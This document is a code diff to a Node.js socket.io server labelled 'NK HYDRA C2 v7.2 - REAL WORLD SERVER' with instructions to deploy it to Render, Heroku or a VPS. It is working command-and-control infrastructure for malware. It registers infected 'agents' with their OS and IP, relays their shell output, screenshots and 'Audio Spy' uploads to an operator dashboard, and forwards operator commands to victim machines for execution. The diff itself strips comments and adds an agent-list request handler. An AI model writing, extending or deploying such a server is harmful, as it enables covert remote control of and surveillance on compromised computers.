@@ -1,4 +1,4 @@
-// NK HYDRA C2 v7.1 - REAL WORLD SERVER
+// NK HYDRA C2 v7.2 - REAL WORLD SERVER
 // DEPLOY THIS TO RENDER/HEROKU/VPS
 const express = require('express');
 const http = require('http');
@@ -9,7 +9,6 @@ const app = express();
 app.use(cors());
 
 // --- EMBEDDED DASHBOARD UI (SERVED ON /) ---
-// Note: Using concatenation for inner JS to avoid template literal nesting issues in Node.js
 const dashboardHTML = `
 <!DOCTYPE html>
 <html lang="en">
@@ -58,7 +57,6 @@ const dashboardHTML = `
 
         function addLog(msg) {
             const div = document.createElement('div');
-            // Safe concatenation to avoid template literal nesting errors
             div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
             logsDiv.prepend(div);
         }
@@ -79,7 +77,6 @@ const dashboardHTML = `
 
             agents.forEach(a => {
                 const isOnline = a.status === 'Online';
-                // Using concatenation for HTML construction
                 let html = '<div class="node ' + (isOnline ? 'online' : 'offline') + '">';
                 html += '<div style="font-weight:bold; margin-bottom:5px;">';
                 html += '<span class="status-dot ' + (isOnline ? 'bg-green' : 'bg-red') + '"></span> ' + a.id;
@@ -110,9 +107,7 @@ let agents = [];
 io.on('connection', (socket) => {
     console.log('New connection:', socket.id);
 
-    // Identify Agent or UI
     socket.on('identify', (data) => {
-        // data = { type: 'agent' | 'ui', id, os, ip }
         if(data.type === 'agent') {
             const existing = agents.find(a => a.id === data.id);
             if(existing) {
@@ -130,35 +125,32 @@ io.on('connection', (socket) => {
                     lastSeen: Date.now()
                 });
             }
-            // Broadcast update to all connected clients (UIs)
             io.emit('agents_list', agents);
             io.emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'Agent Connected' });
         } else if (data.type === 'ui') {
-             // FIX: Send current list to UI immediately upon connection
-             // This solves the '0 Agents' issue on Dashboard
              socket.emit('agents_list', agents);
         }
+    });
+    
+    // NEW: Allow UI to request fresh list manually
+    socket.on('get_agents', () => {
+        socket.emit('agents_list', agents);
     });
 
     socket.on('disconnect', () => {
         const agent = agents.find(a => a.socketId === socket.id);
         if(agent) {
             agent.status = 'Offline';
-            io.emit('agents_list', agents); // Notify UIs
+            io.emit('agents_list', agents);
             io.emit('agent_event', { type: 'SYSTEM', agentId: agent.id, payload: 'Agent Disconnected' });
         }
     });
 
-    // Handle Data from Agent (Screenshot, Logs)
     socket.on('stream_log', (data) => {
-        // Relay to UIs
         io.emit('agent_event', { type: 'SHELL_OUTPUT', agentId: data.from, payload: data.output });
     });
     
-    // Handle File Uploads (Audio Spy / Screenshots)
     socket.on('upload_file', (data) => {
-        // data = { target, filename, b64content }
-        // For now, just relay it as an event to the Dashboard
         io.emit('agent_event', { 
             type: 'SCREENSHOT', 
             agentId: data.target || 'Unknown', 
@@ -166,9 +158,7 @@ io.on('connection', (socket) => {
         });
     });
 
-    // Handle Commands from UI to Agent
     socket.on('exec_cmd', (data) => {
-        // data = { targetId, cmd }
         const target = agents.find(a => a.id === data.targetId);
         if(target && target.status === 'Online') {
             io.to(target.socketId).emit('exec', { cmd: data.cmd });
